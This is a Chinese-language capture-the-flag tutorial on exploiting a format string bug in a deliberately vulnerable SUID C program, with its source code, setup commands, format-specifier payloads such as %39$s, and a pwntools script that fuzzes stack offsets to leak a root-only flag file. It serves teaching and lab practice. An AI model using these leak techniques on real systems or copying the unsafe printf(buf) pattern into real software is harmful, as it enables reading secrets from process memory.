# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用

下载这个github库，进入07文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```
还是和上一篇文件一样，设置文件权限，将flag设置位只能root可读
```
chown root:root flag.txt
chmod 700 flag.txt
chown root:root format_vuln
```
设置程序位suid位
```
chmod 4655 format_vuln
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/30034a6c1e5b4d1d89e1d551c6e1725f.png)


# 获取文件信息
首先我们登录普通用户，然后使用checksec工具可以查看程序更详细的信息
```
checksec format_vuln
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b78f27d6aee842a9a54308c40d3b7478.png)


从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
启用了数据执行防护
没有pie，意思是程序的内存空间不会被随机化
```

查看程序源代码


![在这里插入图片描述](https://img-blog.csdnimg.cn/401fa9fe461542d69c21cfe9b6f44995.png)

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  gid_t gid = getegid();  
  setresgid(gid, gid, gid);  //保证程序以root身份运行

  puts("We will evaluate any format string you give us with printf().");   //输出字符串
  
  FILE *file = fopen("flag.txt", "r");   //获取flag文件
  if (file == NULL) {    //如果flag文件不存在则退出程序
    printf("flag.txt is missing!\n");   //输出字符
    exit(0);   //退出程序
  }
  
  fgets(flag, sizeof(flag), file);    //获取flag字符串
  
  while(1) {   //一个循环
    printf("> ");   //输出字符串
    fgets(buf, sizeof(buf), stdin);    //获取我们的输入
    printf(buf);   //将我们的输入打印出来
  }  
  return 0;
}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d06fc00da9bb4f6e8af808b616dc3c0c.png)
在这个程序里，最关键的地方就是printf函数这里，他是直接执行我们输入的内容，我们可以输入格式化的字符串来获取我们想要的信息
```
https://www.freecodecamp.org/news/format-specifiers-in-c/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8e792144ddbb428fb7d60602efcd8044.png)

更详细的格式化字符串攻击的文章：
```
https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0009a9dfd36b4457be494038a56a1c04.png)





# 从堆栈中泄漏值
现在我们运行程序看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/bec2114ca4694368be7d00ccfb309f9e.png)

即使输入了很长的字符串也没有溢出缓冲区，但是我们输入%x试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/bf45ac0153c2474fb0d5193c771efeb8.png)


可以看到，他输出了一些十六进制值，因为%x是从堆栈中读取数据的意思，printf函数打印了堆栈中内容，我们使用unhex将这些十六进制转换成ascii码看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/fdcd7d97b6194fac806deea5986b319f.png)
可以看到倒叙的flag字符串，这些都是程序堆栈里的值，现在我们寻找一下程序的动态链接库的地址

列如，我还可以指定输出堆栈上的第n个参数
```
%10$x    //打印堆栈里第十个参数
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1054e0da250e44649bd29211943cc052.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/11a5d3141982477182091867adc3f7ba.png)

但是我们输入%s就会报错

![在这里插入图片描述](https://img-blog.csdnimg.cn/3567b8c945a747cd9da1c64e9ef2ab70.png)



因为%s的意思是打印字符串，他会把当前地址看作指针，然后跳转到指定的位置再输出字符串，而第一个值不是一个有效的内存地址，所以报错了


![在这里插入图片描述](https://img-blog.csdnimg.cn/c317c7215e794bc2af1400f353a0d4f5.png)

我们需要一个一个尝试哪里是存放flag的地址，我们可以写一个遍历的脚本

![在这里插入图片描述](https://img-blog.csdnimg.cn/f6e4c221611349d0b586a39b23f4e859.png)




# pwntools
```
from pwn import *


elf = context.binary = ELF('./format_vuln', checksec=False)  //自动获取程序详细信息，如架构，操作系统

for i in range(100):   //对程序进行fuzz测试
    try:
        p = process(level='error')  //创建进程
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())  //程序发现'>'时发送指定内容，将第n个指针打印为字符串
        result = p.recvuntil(b'> ')   //接收程序输出的值，并存放到result变量里
        print(str(i) + ': ' + str(result))   //输出值
        p.close()  //退出程序
    except EOFError:    //如果程序运行失败
        pass    //退出程序

```

运行程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/c1056bc5f30a4a3f9f835899f6d0cc5e.png)

在第39个内存地址处发现了flag，我们直接输入也能看到flag
```
%39$s
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b8b1e87c0d73417e8fda132c8f6e8c85.png)

格式化字符串漏洞文章
```
https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
https://axcheron.github.io/exploit-101-format-strings/
https://docs.pwntools.com/en/stable/fmtstr.html
```
